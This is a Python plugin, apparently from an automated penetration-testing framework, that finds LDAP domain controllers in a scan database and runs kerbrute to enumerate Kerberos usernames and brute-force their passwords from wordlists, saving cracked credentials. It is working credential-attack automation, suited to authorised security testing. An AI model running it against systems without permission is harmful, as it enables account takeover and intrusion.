import datetime
import logging
import os
import re
import subprocess
from typing import Union

from plugins.core import (
    HostModel,
    HostUserModel,
    ServiceCredentials,
    ServiceModel,
    database_proxy,
    get_targets_predicate,
    plugin,
)


@plugin("kerbrute")
def kerbrute_executor(
    *targets: Union[str, int],
    save_dir: str,
    logger: logging.Logger,
    user_wordlist: str,
    password_wordlist: str,
):
    """
    Use kerbrute on targets to bruteforce credentials.
    First, bruteforce users. If successful, bruteforce passwords with valid users.

    :param targets: target to bruteforce. Can be IP address, range of IP or network IP.
    :param save_dir: directory to save raw kerbrute outputs.
    :param logger: task logger.
    :param user_wordlist: wordlist of potential usernames.
    :param password_wordlist: wordlist of potential passwords.
    """

    target_predicate = get_targets_predicate(*targets)
    kerbrute_targets = (
        HostModel.select(HostModel, ServiceModel.extra_info)
        .distinct()
        .join_from(HostModel, ServiceModel, on=(HostModel.id == ServiceModel.host))
        .where(
            target_predicate
            & (ServiceModel.name == "ldap")
            & (ServiceModel.extra_info % "*Domain: *0.*")
        )
    ).objects()

    if not kerbrute_targets.exists():
        logger.info("No kerbrute target, skip.")
        return

    user_enumeration_dir = os.path.join(save_dir, "user_enumeration")
    password_bruteforce_dir = os.path.join(save_dir, "bruteforce")

    os.makedirs(user_enumeration_dir, exist_ok=True)
    os.makedirs(password_bruteforce_dir, exist_ok=True)

    for target_host in kerbrute_targets:
        target_domain_match = re.search(
            r"Domain:\s(?P<domain>[^/]+)0\.", target_host.extra_info
        )

        if target_domain_match is None:
            continue

        logger.debug(f"Running kerbrute on target: {target_host.get_ip()}")
        target_domain = target_domain_match.group("domain")
        logger.info(
            f"Attacking Kerberos on domain {target_domain} at {target_host.get_ip()}"
        )

        run_time = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
        suffix = f"{run_time}_{target_domain}_{target_host.get_ip()}"
        user_enum_basename = os.path.join(user_enumeration_dir, suffix)
        bruteforce_basename = os.path.join(password_bruteforce_dir, suffix)

        user_enum_log_path = user_enum_basename + ".log"
        db_user_enum_basename = user_enum_basename + "_db"
        db_user_wordlist_path = db_user_enum_basename + ".wordlist"
        db_user_enum_log_path = db_user_enum_basename + ".log"

        bruteforce_log_path = bruteforce_basename + ".log"
        db_bruteforce_basename = bruteforce_basename + "_db"
        db_password_wordlist_path = db_bruteforce_basename + ".wordlist"
        db_bruteforce_log_path = db_bruteforce_basename + ".log"

        try:
            setup_database_username_wordlist(db_wordlist_path=db_user_wordlist_path)
        except ValueError:
            logger.warning(
                "No user found in database, skip enumeration with database users."
            )
        else:
            enumerate_users(
                target_host,
                target_domain,
                db_user_enum_log_path,
                logger,
                db_user_wordlist_path,
            )

        enumerate_users(
            target_host, target_domain, user_enum_log_path, logger, user_wordlist
        )

        known_users = (
            HostUserModel.select(HostUserModel.username)
            .distinct()
            .where(HostUserModel.host == target_host)
        )

        try:
            setup_database_password_wordlist(db_wordlist_path=db_password_wordlist_path)
        except ValueError:
            logger.warning(
                "No password found in database, "
                "skip bruteforce with database passwords."
            )
        else:
            logger.debug("Bruteforce using database passwords.")
            for known_user in known_users:
                bruteforce_user(
                    target_host,
                    target_domain,
                    db_bruteforce_log_path,
                    logger,
                    known_user.username,
                    db_password_wordlist_path,
                )

        logger.debug(f"Bruteforce using provided wordlist: {password_wordlist}")
        for known_user in known_users:
            bruteforce_user(
                target_host,
                target_domain,
                bruteforce_log_path,
                logger,
                known_user.username,
                password_wordlist,
            )


def enumerate_users(
    target_host: HostModel,
    target_domain: str,
    log_path: str,
    logger: logging.Logger,
    user_wordlist: str,
):
    """
    Use Kerbrute in order to bruteforce usernames.
    Try to use known usernames from provided wordlist.

    :param target_host: target host node.
    :param target_domain: full-qualified domain name of target.
    :param log_path: logfile to save bruteforce.
    :param logger: task logger.
    :param user_wordlist: wordlist of usernames to try.
    """

    user_regex = re.compile(
        fr"\[\+]\sVALID\sUSERNAME:\s+(?P<username>[^@]+)@{target_domain}"
    )

    logger.debug(f"Enumerate users from wordlist: {user_wordlist}")

    kerbrute_cmd = [
        "kerbrute",
        "userenum",
        "--dc",
        target_host.get_ip(),
        "--domain",
        target_domain,
        user_wordlist,
    ]

    logger.debug(f"Running command: {' '.join(kerbrute_cmd)}")

    proc_user_enumeration = subprocess.check_output(kerbrute_cmd).decode()

    with open(log_path, "w") as log_file:
        log_file.write(proc_user_enumeration)

    host_users_to_create = set()

    for found_user in user_regex.finditer(proc_user_enumeration):
        username = found_user.group("username").lower()
        host_user_query = HostUserModel.select().where(
            HostUserModel.username == username
        )

        if not host_user_query.exists():
            host_user = HostUserModel(host=target_host, username=username)
            host_users_to_create.add(host_user)

    logger.debug(
        f"Found {len(host_users_to_create)} "
        f"username{'s' if len(host_users_to_create) > 1 else ''}."
    )

    if len(host_users_to_create) > 0:
        with database_proxy.atomic():
            HostUserModel.bulk_create(host_users_to_create)


def bruteforce_user(
    target_host: HostModel,
    target_domain: str,
    log_path: str,
    logger: logging.Logger,
    username: str,
    password_wordlist: str,
):
    target_kerberos_service = ServiceModel.get(host=target_host, name="kerberos-sec")
    target_ldap_services = list(
        ServiceModel.select().where(
            (ServiceModel.host == target_host) & (ServiceModel.name == "ldap")
        )
    )
    credentials_regex = re.compile(
        r"\[\+]\sVALID\sLOGIN:\s+"
        fr"(?P<username>[^@]+)@{target_domain}:(?P<password>[^\n\r\u001b]*)"
    )

    logger.debug(f"Bruteforce user {username}")

    kerbrute_cmd = [
        "kerbrute",
        "bruteuser",
        "--dc",
        target_host.get_ip(),
        "--domain",
        target_domain,
        password_wordlist,
        username,
    ]

    logger.debug(f"Running command: {' '.join(kerbrute_cmd)}")

    proc_user_enumeration = subprocess.check_output(kerbrute_cmd).decode()

    with open(log_path, "a") as log_file:
        log_file.write(proc_user_enumeration)
        log_file.write("\r\n")

    credentials_to_create = set()

    for crack_match in credentials_regex.finditer(proc_user_enumeration):
        username = crack_match.group("username")
        password = crack_match.group("password")

        for service in (target_kerberos_service, *target_ldap_services):
            credentials_query = ServiceCredentials.select().where(
                (ServiceCredentials.service == service)
                & (ServiceCredentials.username == username)
                & (ServiceCredentials.password == password)
            )

            if not credentials_query.exists():
                new_credentials = ServiceCredentials(
                    service=service, username=username, password=password
                )
                credentials_to_create.add(new_credentials)

    logger.debug(
        f"Found {len(credentials_to_create)} "
        f"credential{'s' if len(credentials_to_create) > 1 else ''}."
    )

    if len(credentials_to_create) > 0:
        with database_proxy.atomic():
            ServiceCredentials.bulk_create(credentials_to_create)


def setup_database_username_wordlist(*targets: Union[str, int], db_wordlist_path: str):
    """Store known usernames from database to wordlist."""

    known_users = HostUserModel.select(HostUserModel.username).distinct()

    if len(targets) > 0:
        host_predicate = get_targets_predicate(*targets)
        known_users = known_users.join_from(
            HostUserModel, HostModel, on=(HostUserModel.host == HostModel.id)
        ).where(host_predicate)

    if known_users.exists():
        with open(db_wordlist_path, "w") as db_wordlist_file:
            db_wordlist_file.writelines(map(lambda x: x.username, known_users))
    else:
        raise ValueError("No user found.")


def setup_database_password_wordlist(*targets: Union[str, int], db_wordlist_path: str):
    """Store known password from database to wordlist."""

    known_passwords = ServiceCredentials.select(ServiceCredentials.password).distinct()

    if len(targets) > 0:
        host_predicate = get_targets_predicate(*targets)
        known_passwords = (
            known_passwords.join_from(
                ServiceCredentials,
                ServiceModel,
                on=(ServiceCredentials.service == ServiceModel.id),
            )
            .join_from(ServiceModel, HostModel, on=(ServiceModel.host == HostModel.id))
            .where(host_predicate)
        )

    if known_passwords.exists():
        with open(db_wordlist_path, "w") as db_wordlist_file:
            db_wordlist_file.writelines(map(lambda x: x.username, known_passwords))
    else:
        raise ValueError("No password found.")
